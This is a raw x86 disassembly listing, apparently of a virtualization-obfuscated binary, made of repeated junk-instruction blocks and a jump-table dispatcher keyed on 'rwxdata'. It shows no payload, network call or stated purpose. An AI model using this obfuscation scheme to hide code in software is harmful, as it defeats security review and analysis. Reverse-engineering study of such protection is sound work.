mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511321
cld
movzx di cl
bswap edi
mov [ esp ] esi
xchg esi edi
pushad
lea edi [ 0x55b4ce21 ]
push 0xa1f4f644
mov esi edx
movzx di cl
lea edi [ 0xffffffffd298cfbf ]
lea edi [ ecx + eax - 0x40 ]
cld
cld
xchg [ esp + 0x20 ] edi
lea edi [ esp - 0x36554ef2 ]
mov edi eax
pushfd
pushfd
jmp rwxdata
push 0x7a9168d6
cld
call sub_513e3d
fldcw [ ebp ]
push 0xd323d24b
pushfd
pushad
lea esp [ esp + 0x30 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51137f
mov [ esp + 0x4 ] bh
push [ esp ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4 ] 0xee
push 0x1de0f1a3
mov [ esp + 0x40 ] esi
mov [ esp + 0x4 ] 0x24a
mov [ esp + 0x3c ] edi
call j_sub_513b37
cmc
cmc
test edx edx
sub ebp 0x2
jmp rwxdata
pushad
pushfd
call sub_511f83
shl ah cl
aad 0x30
bts ax 0x5
mov eax [ ebp ]
inc dl
and dl bl
mov dl [ ebp + 0x4 ]
cmc
call sub_511849
cmc
cmp bh 0x2c
add ebp 0x6
call sub_5142ab
sub_511416
pushfd
mov [ esp ] bh
push [ rwxdata ]
pop [ esp + 0x48 ]
push ebx
pushfd
mov [ esp + 0x4c ] 0x0
push [ esp + 0x10 ]
mov [ esp ] bp
mov [ esp ] dl
lea esp [ esp + 0x50 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511485
mov [ esp + 0x20 ] ecx
push esi
mov [ esp + 0x20 ] edx
jmp rwxdata
jmp rwxdata
pushfd
pop [ esp + 0x1c ]
push edx
push 0x3a284149
mov [ esp + 0x20 ] ebx
pushad
push [ rwxdata ]
pop [ esp + 0x3c ]
call sub_511b15
mov [ esp + 0x2c ] edx
push esp
jmp rwxdata
push 0xb196af6
pushfd
pushfd
pop [ esp + 0x34 ]
jmp sub_513c1c
sub_5114ae
shl ax cl
mov [ esp + 0x4 ] ax
push ecx
push [ esp + 0xc ]
mov [ ebp + 0x4 ] ax
push esp
mov [ esp + 0x8 ] esp
pushfd
pop [ esp + 0x18 ]
push 0x7dfd88c1
push 0x2460d6f
push eax
pushfd
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp + 0x4 ] 0x41eaf442
pushfd
lea esp [ esp + 0x30 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51150a
cmc
cmc
cmp ebx 0xfe0
pushfd
pushfd
push [ esp ]
lea esp [ esp + 0x18 ]
jne rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
call sub_513f98
cmp esp 0xebcd9eac
push edi
call sub_511b50
rcr ax cl
mov eax [ ebp ]
bt bp 0x7
mov dx [ ebp + 0x4 ]
call sub_5121d7
mov al 0xcb
pushfd
bswap ax
pushad
mov eax [ ebp ]
call j_sub_513c36
pushfd
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
pushfd
pop [ esp + 0x4c ]
mov [ esp + 0x8 ] cl
pushfd
lea esp [ esp + 0x50 ]
jge rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
pushad
jmp rwxdata
push edi
mov [ esp ] ebx
pushfd
push [ esp ]
pushfd
push [ rwxdata ]
pop [ esp + 0x8 ]
mov [ esp ] bh
push 0x8c595a6d
mov [ esp ] bl
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x4 ] ch
mov [ esp + 0x4 ] ah
mov [ esp + 0x4 ] esp
lea esp [ esp + 0x8 ]
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] ebx
call sub_5135eb
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
sub_5115a5
mov [ fs : eax ] edx
push [ esp + 0x4 ]
push 0xe4bd86df
lea esp [ esp + 0x38 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5115d3
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x4 ] sp
pushfd
mov [ esp ] 0x84
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5115f8
mov [ esp + 0x34 ] ecx
mov [ esp ] ch
call sub_513853
pushfd
push 0x3dfecbd
push [ rwxdata ]
pop [ esp + 0x4 ]
mov [ esp ] 0x324a258b
pushfd
jmp rwxdata
mov [ esp ] 0x7e
mov [ esp + 0x4 ] 0x0
pushfd
push [ esp + 0x4 ]
pushad
lea esp [ esp + 0x2c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511621
push [ esp + 0x28 ]
pop [ ebp ]
pushfd
pushfd
pushfd
mov [ esp + 0x4 ] bh
lea esp [ esp + 0x38 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5116b8
call sub_51218b
add [ eax ] al
add [ eax ] al
jmp rwxdata
setge bh
pop ebx
pushfd
mov [ esp ] esi
lea esp [ esp + 0x4 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5116d6
pushfd
pop [ esp + 0x3c ]
mov [ esp + 0xc ] 0x42cc
mov [ esp ] 0x53
call sub_5136bd
push esp
mov [ esp ] ecx
pushfd
mov [ esp ] ebp
call sub_5136b7
pushfd
mov [ esp + 0x8 ] 0x73
mov [ esp + 0x44 ] 0x0
mov [ esp ] 0x70da
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511716
mov [ esp + 0x4 ] eax
pushfd
jmp rwxdata
mov [ esp + 0x4 ] esi
pushfd
jmp rwxdata
pushad
push [ esp ]
mov [ esp + 0x28 ] edi
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] ecx
jmp rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x8 ] cx
pushfd
pushfd
pop [ esp + 0x28 ]
pushfd
lea esp [ esp + 0x2c ]
je rwxdata
pushfd
pushad
call sub_511276
xchg bp ax
pop eax
jmp rwxdata
push edi
pushfd
mov [ esp + 0x4 ] ebx
pushad
mov [ esp + 0x8 ] ax
mov [ esp ] bx
push [ rwxdata ]
pop [ esp + 0x20 ]
pushad
jmp rwxdata
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
push [ esp ]
mov [ esp + 0x40 ] 0x0
push [ esp ]
push 0xad29083b
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51172f
dec esi
mov [ esp + 0x8 ] dl
clc
add ebp 0x2
push esp
jmp rwxdata
call sub_513c00
mov [ esp + 0x20 ] esi
mov [ esp + 0x44 ] edx
mov [ esp + 0x4 ] 0x9bcd
push 0xddd6ab7f
mov [ esp + 0x4 ] dl
push [ esp + 0x48 ]
retn 0x4c
sub_511773
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x48 ]
push 0x59c3ff4f
mov [ esp + 0xc ] 0x6d5002e3
mov [ esp + 0x48 ] 0x0
pushfd
pushfd
mov [ esp ] 0xb5b9
lea esp [ esp + 0x50 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5117fc
mov [ esp + 0x1c ] 0x0
pushfd
mov [ esp + 0x8 ] ah
lea esp [ esp + 0x20 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511849
bt ax 0xb
cmp si 0xef9b
add ebp 0x6
call j_sub_5118e4
jmp rwxdata
mov [ esp + 0x28 ] ebp
not bp
movzx ebp bl
mov bp 0x6857
mov [ esp + 0x24 ] eax
pushfd
xchg [ esp + 0x24 ] esi
mov [ esp + 0x14 ] di
mov [ esp + 0x20 ] edi
not si
movzx si al
call sub_5120b2
mov [ esp + 0x8 ] bp
mov [ eax + edi ] dl
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5118c4
push esi
push esp
push [ rwxdata ]
pop [ esp + 0x48 ]
mov [ esp + 0xc ] 0x8
pushfd
jmp rwxdata
mov [ esp + 0x48 ] 0x0
push 0xe6b8dcb8
lea esp [ esp + 0x4c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5118e4
pushad
push [ esp ]
mov [ ss : eax ] dl
push eax
lea esp [ esp + 0x30 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_511910
pushfd
pop [ esp + 0x2c ]
lea esp [ esp + 0x2c ]
jge rwxdata
push edx
push 0xdc13577b
jmp rwxdata
pushad
mov [ esp ] ch
mov [ esp + 0x4 ] 0xe8
push [ esp + 0x20 ]
pop [ ebp ]
push [ esp ]
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
push [ esp + 0x8 ]
pop [ ebp ]
mov [ esp ] 0xb03e8291
lea esp [ esp + 0xc ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
